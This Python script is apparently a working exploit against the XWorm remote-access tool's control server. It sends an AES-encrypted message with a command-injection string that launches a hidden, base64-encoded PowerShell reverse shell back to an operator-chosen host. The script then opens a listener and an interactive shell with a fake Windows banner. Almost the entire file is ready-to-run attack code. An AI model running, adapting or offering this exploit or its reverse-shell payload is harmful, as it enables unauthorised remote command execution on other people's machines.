# This is simply copy pasted from rce_exploit.py but with another payload
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import keyboard
import hashlib
import socket
import base64
import time
import os

class RceExploitUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = RceExploitUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

class RceExploit:
    SPL_XCLIENT = "<Xwormmm>" # Separator constant, used in all XWorm Versions as far as i know

    @staticmethod
    def main():

        host = input("Host > ") # Get target host
        port = input("Port > ") # Get target port
        key = input("Key > ") # Get encryption key
        sock = RceExploit.connection(host, port) # Connect to target
        host_rs = input("Host for Reverse Shell > ") # Get rs host
        port_rs = input("Port for Reverse Shell > ") # Get rs port
        RceExploit.trigger(host_rs, port_rs, sock, key) # Trigger the Exploit


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def shell(client):
        try:
            os.system('cls' if os.name == 'nt' else 'clear') # Clear console
            os.system("mode 120,30") # Set console size
            print("Microsoft Windows [Swezy's Reverse Shell]\n(c) Microsoft Corporation. All rights reserved.") # Fake Windows Header xD
            keyboard.press("enter") # Simulate Enter key press
            keyboard.release("enter") # Simulate Enter key release
            while True:
                cmd = input("") # Get command input
                if cmd.lower() in ['exit', 'quit']: # Exit command
                    client.sendall(b'exit\n') # Send exit command to client
                    client.close() # Close client socket
                    print("Connection closed.") # Print connection closed message
                    os._exit(0) # Exit program
                elif cmd.lower().startswith("color"): # Handle color command
                    os.system(cmd) # Change console color
                    continue # Continue to next iteration
                elif cmd.lower() in ['cls', 'clear']: # Clear console command
                    RceExploit.shell(client) # Go back to RceExploit.shell

                client.sendall(cmd.encode() + b'\n') # Send command to client
                data = b'' # Initialize empty data buffer
                while True: # Receive command output
                    chunk = client.recv(4096) # Receive data chunk
                    data += chunk # Append chunk to data buffer
                    if b'[EOF]' in data: # Check for end of file marker
                        break # Exit loop if end of file marker is found
                print(data.decode(errors='ignore').replace('[EOF]', ''), end='', flush=True) # Print command output
        except KeyboardInterrupt:
            print("\nConnection closed.") # Print connection closed message
            client.close() # Close client socket
            os._exit(0) # Exit program
        except Exception as e:
            print(f"Shell error: {e}") # Print shell error message
            os._exit(0) # Exit on failure

    def trigger(host, port, sock, key):
        try:
            payload_start = f'hrdp{RceExploit.SPL_XCLIENT}ClientID{RceExploit.SPL_XCLIENT}' 

            RceExploitUtils.send_encrypted(sock, payload_start, key) # Send encrypted message

            raw_command = ('taskkill /f /IM mstsc.exe; $client = New-Object System.Net.Sockets.TcpClient("{host}", {port}); '
                           '$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; '
                           'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{ '
                           '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); '
                           '$sendback = (iex $data 2>&1 | Out-String ); '
                           '$sendback2  = $sendback + "PS " + (pwd).Path + "> [EOF]"; '
                           '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); '
                           '$stream.Write($sendbyte,0,$sendbyte.Length) }}; '
                           '$client.Close()') # PowerShell reverse shell command

            formatted_command = raw_command.format(host=host, port=port) # Format command with host and port

            encoded_command = base64.b64encode(formatted_command.encode('utf-16le')).decode() # Encode command in Base64

            payload = f'hrdp+{RceExploit.SPL_XCLIENT}ClientID{RceExploit.SPL_XCLIENT}t.me/Swezy{RceExploit.SPL_XCLIENT}" & start powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_command}{RceExploit.SPL_XCLIENT}0:0'

            RceExploitUtils.send_encrypted(sock, payload, key) # Send encrypted message
            print("RCE Exploit sent.")

            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create server socket
                server.bind(("0.0.0.0", int(port))) # Bind to all interfaces on specified port
                server.settimeout(30) # Set timeout for accepting connections
                server.listen(1) # Listen for incoming connections
            except Exception as e:
                print(f"Failed to start listener: {e}") # Print error message
                return # Exit if listener fails
            
            print(f"Listening for to {host}:{port}")
            print("Waiting for Clients")
            try:
                client, ip = server.accept() # Accept incoming connection
            except socket.timeout: # Handle timeout exception
                print("No incoming connection within timeout period.")
                server.close() # Close the server socket
                return # Exit the function
            except Exception as e:
                print(f"Error accepting connection: {e}") # Print error message
                server.close() # Close the server socket
                return # Exit the function

            print(f"Client Connected from {ip[0]}:{ip[1]}") # Print client connection info
            time.sleep(2) # Wait for 2 seconds
            RceExploit.shell(client) # Go to Reverse Shell func
        except Exception as e:
            print(f"Failed to send message: {e}") # Print error message
            os._exit(0) # Exit on failure

if __name__ == "__main__":
    RceExploit.main() # Run the main function
